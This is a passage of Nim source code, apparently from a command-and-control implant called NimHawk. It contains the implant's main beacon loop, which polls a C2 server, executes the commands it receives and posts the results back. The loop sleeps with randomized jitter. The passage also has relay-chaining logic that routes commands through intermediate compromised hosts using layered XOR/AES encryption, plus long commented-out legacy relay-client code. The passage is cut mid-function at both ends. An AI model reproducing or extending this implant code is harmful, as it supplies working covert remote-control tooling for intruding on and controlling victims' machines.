                    # INTELLIGENT ROUTING: Check if command is for this relay server or downstream routing
                    let connectedClients = relay_commands.getConnectedClients(g_relayServer)
                    let currentRelayServerID = getRelayServerID()
                    
                    when defined debug:
                        echo "[DEBUG] 🎯 INTELLIGENT ROUTING: Analyzing command destination"
                        echo "[DEBUG] 🎯 - Current relay server ID: " & currentRelayServerID
                        echo "[DEBUG] 🎯 - Command from C2: " & cmd
                        echo "[DEBUG] 🎯 - Connected clients: [" & connectedClients.join(", ") & "]"
                        echo "[DEBUG] 🎯 - Relay server listening: " & $g_relayServer.isListening
                    
                    # Check if command should be routed downstream to relay clients
                    var shouldRouteDownstream = false
                    var targetClientID = ""
                    
                    # Try to extract target client ID from command arguments
                    if args.len > 0:
                        # Look for target client ID in args (this might be sent by C2)
                        let firstArg = args[0]
                        if firstArg in connectedClients:
                            shouldRouteDownstream = true
                            targetClientID = firstArg
                            when defined debug:
                                echo "[DEBUG] 🎯 TARGET DETECTED: Command should be routed to client: " & targetClientID
                    
                    # If no explicit target found, but we have connected clients, check for implicit routing
                    if not shouldRouteDownstream and connectedClients.len > 0:
                        # For now, process commands locally on relay server
                        # In the future, we could implement more sophisticated routing logic
                        when defined debug:
                            echo "[DEBUG] 🎯 NO EXPLICIT TARGET: Processing command locally on relay server"
                    
                    if shouldRouteDownstream and targetClientID != "":
                        # DOWNSTREAM ROUTING: Send command to relay client
                        when defined debug:
                            echo "[DEBUG] 🎯 DOWNSTREAM ROUTING: Sending command to relay client: " & targetClientID
                            echo "[DEBUG] 🎯 - Command: " & cmd
                            echo "[DEBUG] 🎯 - GUID: " & cmdGuid
                            echo "[DEBUG] 🎯 - Args: " & $args
                        
                        # Create command payload for relay client
                        let commandPayload = %*{
                            "cmdGuid": cmdGuid,
                            "command": cmd,  # Already encrypted by C2 with client's UNIQUE_KEY
                            "args": args
                        }
                        
                        # Create command message with SHARED KEY (hop-to-hop encryption)
                        let cmdMsg = createMessage(COMMAND,
                            getRelayServerID(),
                            @[targetClientID, currentRelayServerID],
                            $commandPayload,
                            false  # Use SHARED KEY (INITIAL_XOR_KEY) for hop-to-hop
                        )
                        
                        # Send command to SPECIFIC relay client (unicast)
                        let success = relay_commands.sendToClient(g_relayServer, targetClientID, cmdMsg)
                        if success:
                            when defined debug:
                                echo "[DEBUG] 🎯 ✅ Command routed to relay client: " & targetClientID
                        else:
                            when defined debug:
                                echo "[DEBUG] 🎯 ❌ Failed to route command to relay client: " & targetClientID
                                echo "[DEBUG] 🎯 ❌ Falling back to local processing"
                            # Fallback to local processing if routing fails
                            shouldRouteDownstream = false
                    
                    ]#
                    
                    # HTTP Relay System: Simple local command processing
                    when defined debug:
                        echo "[DEBUG] 🌐 LOCAL PROCESSING: Processing command locally"
                        echo "📨 COMMAND: " & cmd
                        if args.len > 0:
                            echo "📝 ARGUMENTS: " & $args
                        echo "🏷️  GUID: " & cmdGuid
                    
                    let result = cmdParser.parseCmd(listener, cmd, cmdGuid, args)
                    
                    when defined debug:
                        echo "[DEBUG] 💥 COMMAND EXECUTED - SENDING RESPONSE"
                        echo "📤 RESPONSE: " & (if result.len > 200: result[0..199] & "..." else: result)
                        echo "🏷️  GUID: " & cmdGuid
                    
                    # Check if this is the relay start command
                    if result.startsWith("RELAY_START:"):
                        let port = parseInt(result.split(":")[1])
                        when defined debug:
                            echo "[RELAY] 🚀 Starting HTTP relay server on runtime port: " & $port
                            echo "[RELAY] 🆔 Using implant GUID: " & listener.id
                        
                        # Build C2 URL from listener config or extract from RELAY_CHAIN
                        const RELAY_CHAIN {.strdefine.}: string = ""
                        var c2Url: string
                        var parentChain = ""
                        
                        # If we have RELAY_CHAIN, extract C2 URL from the last hop
                        when RELAY_CHAIN != "":
                            parentChain = RELAY_CHAIN
                            when defined debug:
                                echo "[RELAY] 🔗 Extracting C2 from relay chain"
                            
                            # The last hop in RELAY_CHAIN is the C2
                            # Clean and validate hops (trim whitespace, filter empties)
                            var cleanHops: seq[string] = @[]
                            for hop in parentChain.split(","):
                                let trimmedHop = hop.strip()
                                if trimmedHop.len > 0:
                                    cleanHops.add(trimmedHop)
                            
                            if cleanHops.len > 0:
                                let c2Hop = cleanHops[cleanHops.len - 1]
                                
                                # Check if hop already has protocol
                                if c2Hop.startsWith("http://") or c2Hop.startsWith("https://"):
                                    c2Url = c2Hop
                                else:
                                    # Use listener protocol if available, default to http
                                    let protocol = if listener.listenerType != "": toLowerAscii(listener.listenerType) else: "http"
                                    c2Url = protocol & "://" & c2Hop
                                
                                when defined debug:
                                    echo "[RELAY] 🎯 C2 URL configured from chain"
                            else:
                                # Malformed RELAY_CHAIN, fall back to listener config
                                c2Url = ""
                                when defined debug:
                                    echo "[RELAY] ⚠️  Malformed relay chain, falling back to listener config"
                        
                        # Fallback to listener config if no RELAY_CHAIN or extraction failed
                        if c2Url == "":
                            if listener.implantCallbackIp.startsWith("http://") or listener.implantCallbackIp.startsWith("https://"):
                                # Use the full URL as-is (already has protocol)
                                c2Url = listener.implantCallbackIp
                                when defined debug:
                                    echo "[RELAY] 🌐 Using full URL from listener"
                            elif listener.implantCallbackIp != "":
                                # Build URL from components: listenerType + implantCallbackIp + listenerPort
                                let protocol = if listener.listenerType != "": toLowerAscii(listener.listenerType) else: "http"
                                let host = listener.implantCallbackIp
                                let port = listener.listenerPort
                                
                                # Only add port if it's not the default for the protocol
                                if (protocol == "http" and port != "80") or (protocol == "https" and port != "443"):
                                    c2Url = protocol & "://" & host & ":" & port
                                else:
                                    c2Url = protocol & "://" & host
                                
                                when defined debug:
                                    echo "[RELAY] 🔧 Built C2 URL from listener components"
                        
                        when defined debug:
                            if c2Url != "":
                                echo "[RELAY] ✅ C2 URL configured successfully"
                            else:
                                echo "[RELAY] ❌ No C2 URL could be configured"
                            if parentChain != "":
                                echo "[RELAY] 🔗 Parent chain configured"
                        
                        # Start relay server in background (non-blocking)
                        let started = relay_launcher.startRelayServerWithPort(port, listener.id, parentChain, c2Url)
                        
                        # Send response immediately (don't wait for server loop)
                        if started:
                            webClientListener.postCommandResults(listener, cmdGuid, "HTTP Relay server started on port " & $port)
                            when defined debug:
                                echo "[RELAY] ✅ Relay server startup completed, response sent to C2"
                        else:
                            webClientListener.postCommandResults(listener, cmdGuid, "Failed to start relay server (already running or error)")
                            when defined debug:
                                echo "[RELAY] ❌ Failed to start relay server"
                    else:
                        webClientListener.postCommandResults(listener, cmdGuid, result)
                    
                    when defined debug:
                        echo "[DEBUG] 🌐 HTTP Handler: ✅ Command executed and result sent to C2"
            
            # 4. Sleep with jitter (like normal implant)
            # HTTP Relay System: Simplified sleep logic
            let sleepMs = listener.sleepTime * 1000  # Simple fixed sleep based on config
            
            let jitterMs = if listener.sleepJitter > 0:
                int(float(sleepMs) * (listener.sleepJitter / 100.0) * rand(1.0))
            else:
                0
            
            let totalSleepMs = sleepMs + jitterMs
            
            when defined debug:
                echo "[DEBUG] 🌐 HTTP Handler: Sleeping for " & $totalSleepMs & "ms (base: " & $sleepMs & "ms, jitter: " & $jitterMs & "ms)"
            
            # HTTP Relay System: Legacy chain info reporting commented out
            #[
            # 5. CHAIN INFO REPORTING (New distributed topology approach)
            try:
                # Report our chain info to C2 - much simpler than full topology
                # For RELAY_CLIENT, send via relay server; for others, send directly to C2
                let shouldSendChainInfo = if upstreamRelay.isConnected:
                    # RELAY_CLIENT: Always send via relay (no need for C2 connection)
                    true
                else:
                    # RELAY_SERVER/STANDARD: Send directly to C2 (need C2 connection)
                    listener.initialized and listener.registered
                
                if shouldSendChainInfo:
                    # Check for immediate updates from relay commands
                    if relay_commands.g_immediateChainInfoUpdate:
                        when defined debug:
                            echo "[DEBUG] 🔗 Chain Info: IMMEDIATE UPDATE requested"
                        
                        # Use pending chain info from relay command
                        let (myRole, parentGuid, listeningPort) = relay_commands.g_pendingChainInfo
                        
                        # FIXED: Use same logic as regular updates - check upstream connection
                        if upstreamRelay.isConnected:
                            # RELAY_CLIENT or CHAINED RELAY_SERVER: Send via upstream relay server with double encryption
                            let chainMsg = relay_protocol.createChainInfoMessage(
                                g_relayClientID,
                                @[g_relayClientID, g_parentRelayServerGuid],
                                parentGuid,
                                myRole,
                                listeningPort,
                                g_relayClientKey  # DOUBLE ENCRYPTION: Use client's UNIQUE_KEY
                            )
                            let success = relay_comm.sendMessage(upstreamRelay, chainMsg)
                            
                            when defined debug:
                                if success:
                                    echo "[DEBUG] 🔗 Chain Info: ✅ IMMEDIATE update sent via UPSTREAM RELAY (" & myRole & ")"
                                else:
                                    echo "[DEBUG] 🔗 Chain Info: ❌ IMMEDIATE update failed via upstream relay"
                        else:
                            # ROOT RELAY_SERVER/STANDARD: Send directly to C2
                            webClientListener.postChainInfo(listener, listener.id, parentGuid, myRole, listeningPort)
                            
                            when defined debug:
                                echo "[DEBUG] 🔗 Chain Info: ✅ IMMEDIATE update sent DIRECTLY to C2 (role: " & myRole & ")"
                        
                        # Reset immediate update flag
                        relay_commands.g_immediateChainInfoUpdate = false
                        
                        when defined debug:
                            echo "[DEBUG] 🔗 Chain Info: ✅ IMMEDIATE update completed - Role=" & myRole & ", Parent=" & parentGuid & ", Port=" & $listeningPort
                    else:
                        # Determine our role and parent info for regular updates
                        var myRole = "STANDARD"
                        var parentGuid = ""
                        var listeningPort = 0
                        
                        # Determine role based on relay server status and relay client connection
                        # FIXED: Handle chained relay servers (RELAY_SERVER with upstream connection)
                        if g_relayServer.isListening:
                            myRole = "RELAY_SERVER"
                            listeningPort = g_relayServer.port
                            
                            # CRITICAL: If we're also connected upstream, we have a parent GUID
                            if upstreamRelay.isConnected:
                                # CHAINED RELAY SERVER: Has both upstream connection AND listens for downstream
                                parentGuid = getParentRelayServerGuid()
                                if parentGuid == "":
                                    parentGuid = g_parentRelayServerGuid
                                when defined debug:
                                    echo "[DEBUG] 🔗 Chain Info: CHAINED RELAY SERVER - listening on " & $listeningPort & ", parent: " & parentGuid
                            else:
                                # ROOT RELAY SERVER: Direct to C2, no parent
                                parentGuid = ""
                                when defined debug:
                                    echo "[DEBUG] 🔗 Chain Info: ROOT RELAY SERVER - direct to C2"
                        elif upstreamRelay.isConnected:
                            myRole = "RELAY_CLIENT"
                            # Use stored parent relay server GUID
                            parentGuid = getParentRelayServerGuid()
                            
                            # CRITICAL FIX: If we don't have parent GUID yet, try to discover it
                            if parentGuid == "":
                                parentGuid = extractParentGuidFromRelayConnection()
                                if parentGuid == "":
                                    # Last resort: try to extract from g_parentRelayServerGuid
                                    parentGuid = g_parentRelayServerGuid
                                    when defined debug:
                                        echo "[DEBUG] 🔗 Chain Info: Using fallback parent GUID: " & parentGuid
                                else:
                                    when defined debug:
                                        echo "[DEBUG] 🔗 Chain Info: Extracted parent GUID: " & parentGuid
                        else:
                            myRole = "STANDARD"
                            parentGuid = ""  # Direct to C2
                        
                        when defined debug:
                            echo "[DEBUG] 🔗 Chain Info: Role=" & myRole & ", Parent=" & parentGuid & ", Port=" & $listeningPort
                        
                        # Send chain info to C2 (every few cycles to avoid spam)
                        if httpCycleCount mod 10 == 1:  # Every 10th cycle
                            if upstreamRelay.isConnected:
                                # RELAY_CLIENT or CHAINED RELAY_SERVER: Send via upstream relay server with double encryption
                                let chainMsg = relay_protocol.createChainInfoMessage(
                                    g_relayClientID,
                                    @[g_relayClientID, g_parentRelayServerGuid],
                                    parentGuid,
                                    myRole,
                                    listeningPort,
                                    g_relayClientKey  # DOUBLE ENCRYPTION: Use client's UNIQUE_KEY
                                )
                                let success = relay_comm.sendMessage(upstreamRelay, chainMsg)
                                
                                when defined debug:
                                    if success:
                                        echo "[DEBUG] 🔗 Chain Info: ✅ Regular update sent via UPSTREAM RELAY (" & myRole & ")"
                                    else:
                                        echo "[DEBUG] 🔗 Chain Info: ❌ Failed to send via upstream relay"
                            else:
                                # ROOT RELAY_SERVER/STANDARD: Send directly to C2
                                webClientListener.postChainInfo(listener, listener.id, parentGuid, myRole, listeningPort)
                                
                                when defined debug:
                                    echo "[DEBUG] 🔗 Chain Info: ✅ Regular update sent DIRECTLY to C2 (role: " & myRole & ")"
                        else:
                            when defined debug:
                                echo "[DEBUG] 🔗 Chain Info: Skipping cycle " & $httpCycleCount & " (sends every 10th)"
                else:
                    when defined debug:
                        echo "[DEBUG] 🔗 Chain Info: Not registered yet, skipping"
            except Exception as chainError:
                when defined debug:
                    echo "[DEBUG] 🔗 Chain Info: Error: " & chainError.msg
            ]#
            
            await sleepAsync(totalSleepMs)
            
            when defined debug:
                echo "[DEBUG] 🌐 HTTP Handler: Woke up from sleep, continuing loop"
                echo ""
                echo "┌─ 🌐 END HTTP HANDLER CYCLE"
                echo "├─ 💤 Slept for " & $totalSleepMs & "ms - continuing loop"
                echo "└─────────────────────────────────────────────────────────"
                echo ""
                echo ""
                echo ""
        except Exception as e:
            when defined debug:
                echo "[DEBUG] 🌐 HTTP Handler error: " & e.msg
                echo "[DEBUG] 🌐 HTTP Handler: Exception details: " & e.getStackTrace()
            await sleepAsync(ERROR_RECOVERY_SLEEP) # Optimized error recovery sleep

# HTTP Relay System: Legacy relay client handler commented out
# The HTTP relay system doesn't use a separate relay client handler
# Instead, webClientListener handles RELAY_CHAIN directly via X-Next-Hop headers
#[
# Async relay client handler
proc relayClientHandler(host: string, port: int) {.async.} =
    when defined debug:
        echo "[DEBUG] 🔗 Starting async relay client handler"
        echo "[DEBUG] 🔗 Relay Client Handler: Host=" & host & ", Port=" & $port
        echo "[DEBUG] 🔗 Relay Client Handler: upstreamRelay.isConnected=" & $upstreamRelay.isConnected
    
    var loopCount = 0
    while true:
        try:
            loopCount += 1
            
            when defined debug:
                echo ""
                echo "┌─ 🔗 RELAY CLIENT CYCLE #" & $loopCount
                echo "├─ Host: " & host & ":" & $port & " │ Connected: " & $upstreamRelay.isConnected & " │ ID: " & g_relayClientID
                echo "└─────────────────────────────────────────────────────────"
                echo ""
                echo "[DEBUG] 🔗 Relay Client: Polling upstream relay for messages..."
                echo "[DEBUG] 🔗 Relay Client: Connection status: " & $upstreamRelay.isConnected
            
            # SOCKET HEALTH DIAGNOSTICS: Check if client socket is still valid
            when defined debug:
                try:
                    let clientFd = upstreamRelay.socket.getFd()
                    if clientFd == osInvalidSocket:
                        echo "[DEBUG] 🚨 ┌─────────── SOCKET CORRUPTION DETECTED ───────────┐"
                        echo "[DEBUG] 🚨 │ Client socket FD is INVALID! │"
                        echo "[DEBUG] 🚨 │ This explains why send/recv fail │"
                        echo "[DEBUG] 🚨 │ Socket was corrupted gradually │"
                        echo "[DEBUG] 🚨 └─────────────────────────────────────────────────┘"
                        upstreamRelay.isConnected = false
                        await sleepAsync(ERROR_RECOVERY_SLEEP)
                        continue
                    else:
                        echo "[DEBUG] 🔍 Socket health check - FD: " & $int(clientFd) & " (valid)"
                except Exception as fdError:
                    echo "[DEBUG] 🚨 ┌─────────── SOCKET FD ERROR ───────────┐"
                    echo "[DEBUG] 🚨 │ Cannot check socket FD: " & fdError.msg & " │"
                    echo "[DEBUG] 🚨 │ Socket is definitely corrupted │"
                    echo "[DEBUG] 🚨 └─────────────────────────────────────────┘"
                    upstreamRelay.isConnected = false
                    await sleepAsync(ERROR_RECOVERY_SLEEP)
                    continue
            
            let messages = pollUpstreamRelayMessages()  # Uses safe polling with timeout
            
            # UPDATE SUCCESS TIME: If we received messages, update last success time
            if messages.len > 0:
                g_networkHealth.lastSuccessTime = epochTime().int64
                g_networkHealth.consecutiveErrors = 0  # Reset errors when we get responses
            
            when defined debug:
                if messages.len > 0:
                    echo "[DEBUG] 🔗 ═══════════════════════════════════════════════════════════════"
                    echo "[DEBUG] 🔗 RELAY CLIENT: Received " & $messages.len & " messages from relay server"
                    echo "[DEBUG] 🔗 ═══════════════════════════════════════════════════════════════"
                else:
                    echo "[DEBUG] 🔗 Relay Client: No messages from relay server (polling...)"
            
            for msg in messages:
                when defined debug:
                    echo "[DEBUG] 📨 ┌─────────── RELAY CLIENT MESSAGE ───────────┐"
                    echo "[DEBUG] 📨 │ Type: " & $msg.msgType & " │"
                    echo "[DEBUG] 📨 │ From: " & msg.fromID & " │"
                    echo "[DEBUG] 📨 │ Route: " & $msg.route & " │"
                    echo "[DEBUG] 📨 │ Payload: " & $msg.payload.len & " bytes │"
                    echo "[DEBUG] 📨 └─────────────────────────────────────────────┘"
                
                case msg.msgType:
                of COMMAND:
                    # PROPER DECRYPTION: Use smartDecrypt for Base64 → XOR → AES chain
                    when defined debug:
                        echo "[DEBUG] 🔐 === STARTING PROPER DECRYPTION CHAIN ==="
                        echo "[DEBUG] 🔐 Process: Base64 decode → XOR decode → AES decode"
                        echo "[DEBUG] 🎯 ┌─────────── COMMAND FROM C2 VIA RELAY ───────────┐"
                        echo "[DEBUG] 🎯 │ ✅ COMMAND RECEIVED FROM C2 (via relay server) │"
                        echo "[DEBUG] 🎯 │ Command from ID: " & msg.fromID & " │"
                        echo "[DEBUG] 🎯 │ Route: " & $msg.route & " │"
                        echo "[DEBUG] 🎯 │ Encrypted payload: " & $msg.payload.len & " bytes │"
                        echo "[DEBUG] 🎯 └─────────────────────────────────────────────────┘"
                    
                    # Use smartDecrypt for proper Base64 → XOR → AES decryption
                    let decryptedPayload = relay_protocol.smartDecrypt(msg.payload)
                    
                    when defined debug:
                        echo "[DEBUG] 🔐 smartDecrypt complete - decrypted length: " & $decryptedPayload.len
                        echo "[DEBUG] 🔐 Decrypted command data: " & decryptedPayload
                    
                    var actualCommand: string
                    var cmdGuid: string
                    var args: seq[string] = @[]
                    
                    try:
                        # Parse the decrypted command JSON
                        let commandData = parseJson(decryptedPayload)
                        
                        cmdGuid = commandData["cmdGuid"].getStr()
                        actualCommand = commandData["command"].getStr()
                        if commandData.hasKey("args"):
                            for arg in commandData["args"]:
                                args.add(arg.getStr())
                        
                        when defined debug:
                            echo "[DEBUG] 🔐 === PROPER DECRYPTION COMPLETE ==="
                            echo "[DEBUG] 📋 ┌─────────── FINAL COMMAND DATA ───────────┐"
                            echo "[DEBUG] 📋 │ cmdGuid: " & cmdGuid & " │"
                            echo "[DEBUG] 📋 │ Command: " & actualCommand & " │"
                            echo "[DEBUG] 📋 │ Args: " & $args & " │"
                            echo "[DEBUG] 📋 └─────────────────────────────────────────────────┘"
                            
                    except Exception as e:
                        when defined debug:
                            echo "[DEBUG] 🔐 JSON parsing failed, trying as plain text: " & e.msg
                        
                        # Fallback: treat as plain command
                        actualCommand = decryptedPayload
                        cmdGuid = ""
                        
                        when defined debug:
                            echo "[DEBUG] 📋 ┌─────────── FALLBACK TO PLAIN TEXT ───────────┐"
                            echo "[DEBUG] 📋 │ Using decrypted text as command │"
                            echo "[DEBUG] 📋 │ Command: " & actualCommand & " │"
                            echo "[DEBUG] 📋 └─────────────────────────────────────────────────┘"
                    
                    when defined debug:
                        echo "[DEBUG] ⚡ ┌─────────── COMMAND ANALYSIS ───────────┐"
                        echo "[DEBUG] ⚡ │ Raw actualCommand: '" & actualCommand & "' │"
                        echo "[DEBUG] ⚡ │ Command length: " & $actualCommand.len & " │"
                        echo "[DEBUG] ⚡ │ Starts with 'relay ': " & $actualCommand.startsWith("relay ") & " │"
                        echo "[DEBUG] ⚡ │ First 10 chars: '" & (if actualCommand.len >= 10: actualCommand[0..9] else: actualCommand) & "' │"
                        if args.len > 0:
                            echo "[DEBUG] ⚡ │ Command arguments: " & $args & " │"
                        echo "[DEBUG] ⚡ └─────────────────────────────────────────┘"
                    
                    # CRITICAL FIX: Filter out internal error messages in relay client too
                    if actualCommand == "NIMPLANT_CONNECTION_ERROR" or actualCommand.startsWith("ERROR:") or actualCommand == "NO_COMMANDS":
                        when defined debug:
                            echo "[DEBUG] 🚫 Relay Client: Ignoring internal status message: " & actualCommand
                            echo "[DEBUG] 🚫 Relay Client: This is NOT a real command, skipping processing"
                        # Don't process internal error messages, just continue to next message
                        continue
                    
                    # ========== SUPER PROMINENT DEBUG START ==========
                    when defined debug:
                        echo ""
                        echo "🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨"
                        echo "🚨                                                                    🚨"
                        echo "🚨                   NIMHAWK RELAY CLIENT EXECUTION                  🚨"
                        echo "🚨                                                                    🚨"
                        echo "🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨"
                        echo "🆔 IMPLANT ID OBTAINED: " & g_relayClientID
                        echo "🛤️  ROUTE: " & $msg.route
                        echo "📨 COMMAND RECEIVED AFTER DECRYPT: " & actualCommand
                        if args.len > 0:
                            echo "📝 ARGUMENTS: " & $args
                        echo "🏷️  GUID: " & cmdGuid
                        echo ""
                        echo "🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀"
                        echo "🚀 DECRYPTED COMMAND RECEIVED: '" & actualCommand & "'"
                        echo "🚀 COMMAND GUID: " & cmdGuid
                        echo "🚀 ARGUMENTS: " & $args  
                        echo "🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀"
                        echo ""
                        echo "🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨"
                        echo ""
                    
                    # CRITICAL FIX: Use parseCmdRelay for RelayClient command processing
                    when defined debug:
                        echo "[DEBUG] 🔧 ┌─────────── USING CMDPARSER FOR RELAY CLIENT ───────────┐"
                        echo "[DEBUG] 🔧 │ Command: '" & actualCommand & "' │"
                        echo "[DEBUG] 🔧 │ Args: " & $args & " │"
                        echo "[DEBUG] 🔧 │ Using parseCmdRelay() instead of direct processing │"
                        echo "[DEBUG] 🔧 └─────────────────────────────────────────────────────────┘"
                    
                    echo ""
                    echo "⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡"
                    echo "⚡ EXECUTING COMMAND: '" & actualCommand & "'"
                    echo "⚡ WITH ARGUMENTS: " & $args
                    echo "⚡ GUID: " & cmdGuid
                    echo "⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡"
                    echo ""
                    
                    let result = cmdParser.parseCmdRelay(actualCommand, cmdGuid, args)
                    
                    # ========== SUPER PROMINENT RESPONSE DEBUG ==========
                    when defined debug:
                        echo ""
                        echo "🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥"
                        echo "🔥                                                                    🔥"
                        echo "🔥                   COMMAND EXECUTED - SENDING RESPONSE          🔥"
                        echo "🔥                                                                    🔥"
                        echo "🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥"
                        echo "📤 RESPONSE TO SEND PRE-ENCRYPT: " & result
                        echo "🆔 IMPLANT ID: " & g_relayClientID
                        echo "🛤️  ROUTE: " & $msg.route
                        echo "🏷️  GUID: " & cmdGuid
                        echo "📏 RESPONSE SIZE: " & $result.len & " bytes"
                        echo "🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥"
                        echo ""
                        echo "💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥"
                        echo "💥 UNENCRYPTED RESPONSE: '" & result & "'"
                        echo "💥 SIZE: " & $result.len & " bytes"
                        echo "💥 FOR COMMAND: '" & actualCommand & "'"
                        echo "💥 GUID: " & cmdGuid
                        echo "💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥"
                        echo ""
                    
                    when defined debug:
                        echo "[DEBUG] 🔧 ┌─────────── CMDPARSER RESULT ───────────┐"
                        echo "[DEBUG] 🔧 │ Command processed via parseCmdRelay │"
                        echo "[DEBUG] 🔧 │ Command: '" & actualCommand & "' │"
                        echo "[DEBUG] 🔧 │ Result: " & result & " │"
                        echo "[DEBUG] 🔧 │ After execution g_relayServer.isListening: " & $g_relayServer.isListening & " │"
                        echo "[DEBUG] 🔧 │ After execution g_relayServer.port: " & $g_relayServer.port & " │"
                        echo "[DEBUG] 🔧 └─────────────────────────────────────────────────┘"
                    
                    when defined debug:
                        echo "[DEBUG] 📤 ┌─────────── SENDING RESULT TO RELAY ───────────┐"
                        echo "[DEBUG] 📤 │ Sending result back to relay server... │"
                        echo "[DEBUG] 📤 │ From ID: " & g_relayClientID & " │"
                        echo "[DEBUG] 📤 │ Route: " & $msg.route & " │"
                        echo "[DEBUG] 📤 │ cmdGuid: " & cmdGuid & " │"
                        echo "[DEBUG] 📤 │ Result size: " & $result.len & " bytes │"
                        echo "[DEBUG] 📤 └─────────────────────────────────────────────┘"
                    
                    # Create structured response with cmdGuid and result
                    let responsePayload = %*{
                        "cmdGuid": cmdGuid,
                        "result": result,
                        "clientId": g_relayClientID,
                        "key": xorString(g_relayClientKey, INITIAL_XOR_KEY)  # Include encrypted key
                    }
                    
                    let resultMsg = createMessage(RESPONSE,
                        g_relayClientID,
                        msg.route,
                        $responsePayload
                    )
                    
                    if sendMessage(upstreamRelay, resultMsg):
                        when defined debug:
                            echo "[DEBUG] ✅ ┌─────────── RESULT SENT ───────────┐"
                            echo "[DEBUG] ✅ │ Result sent back to relay server │"
                            echo "[DEBUG] ✅ │ Waiting for C2 confirmation... │"
                            echo "[DEBUG] ✅ └─────────────────────────────────┘"
                    else:
                        when defined debug:
                            echo "[DEBUG] ❌ ┌─────────── SEND FAILED ───────────┐"
                            echo "[DEBUG] ❌ │ Failed to send result to relay │"
                            echo "[DEBUG] ❌ └─────────────────────────────────┘"
                
                of HTTP_RESPONSE:
                    # CRITICAL FIX: Update network health - we received a response successfully
                    g_networkHealth.lastSuccessTime = epochTime().int64
                    g_networkHealth.consecutiveErrors = 0
                    
                    # This could be ID assignment or command result confirmation
                    let responsePayload = relay_protocol.smartDecrypt(msg.payload)
                    
                    when defined debug:
                        echo "[DEBUG] 🔄 ┌─────────── HTTP RESPONSE FROM RELAY ───────────┐"
                        echo "[DEBUG] 🔄 │ ✅ HTTP RESPONSE FROM RELAY SERVER │"
                        echo "[DEBUG] 🔄 │ Response: " & responsePayload & " │"
                        echo "[DEBUG] 🔍 │ BROADCAST FILTER: Message fromID: '" & msg.fromID & "' │"
                        echo "[DEBUG] 🔍 │ BROADCAST FILTER: My client ID: '" & g_relayClientID & "' │"
                        echo "[DEBUG] 🔍 │ BROADCAST FILTER: Message route: " & $msg.route & " │"
                        echo "[DEBUG] ⏰ │ 🎉 NETWORK HEALTH UPDATED - Timer reset! │"
                        echo "[DEBUG] 🔄 └─────────────────────────────────────────────────┘"
                    
                    if responsePayload == "RESULT_SENT_TO_C2":
                        when defined debug:
                            echo "[DEBUG] 🎉 ┌─────────── C2 CONFIRMATION ───────────┐"
                            echo "[DEBUG] 🎉 │ ✅ Command result successfully sent to C2 │"
                            echo "[DEBUG] 🎉 │ End-to-end command flow completed! │"
                            echo "[DEBUG] 🎉 └─────────────────────────────────────────┘"
                    elif responsePayload == "NO_COMMANDS":
                        # This is a normal "no commands" response - don't treat as ID assignment
                        when defined debug:
                            echo "[DEBUG] 💤 ┌─────────── NO COMMANDS RESPONSE ───────────┐"
                            echo "[DEBUG] 💤 │ ✅ No commands available from relay server │"
                            echo "[DEBUG] 💤 │ PULL cycle completed successfully │"
                            echo "[DEBUG] 💤 └─────────────────────────────────────────────┘"
                    elif responsePayload != "" and responsePayload != "PENDING-REGISTRATION" and not responsePayload.startsWith("RESULT_"):
                        # This could be an ID assignment (new JSON format) or old simple ID
                        try:
                            # Try to parse as JSON 
                            let regResponse = parseJson(responsePayload)
                            let assignedId = regResponse["id"].getStr()
                            
                            when defined debug:
                                echo "[DEBUG] 🔍 CLIENT ID VALIDATION: Received response from relay server"
                                echo "[DEBUG] 🔍 CLIENT ID VALIDATION: Raw response: " & responsePayload
                                echo "[DEBUG] 🔍 CLIENT ID VALIDATION: Parsed assignedId: '" & assignedId & "'"
                                echo "[DEBUG] 🔍 CLIENT ID VALIDATION: Current g_relayClientID: '" & g_relayClientID & "'"
                                let diskID = getStoredImplantID()
                                echo "[DEBUG] 🔍 CLIENT ID VALIDATION: Stored disk ID: '" & diskID & "'"
                            
                            # CRITICAL FIX: Only process registration responses meant for THIS client
                            if g_relayClientID != "" and g_relayClientID != "PENDING-REGISTRATION" and g_relayClientID != assignedId:
                                when defined debug:
                                    echo "[DEBUG] 🚨 BROADCAST CONTAMINATION DETECTED!"
                                    echo "[DEBUG] 🚨 This client ID: '" & g_relayClientID & "'"
                                    echo "[DEBUG] 🚨 Response for ID: '" & assignedId & "'"
                                    echo "[DEBUG] 🚨 IGNORING response meant for another client!"
                                # IGNORE responses not meant for this client
                                continue
                            
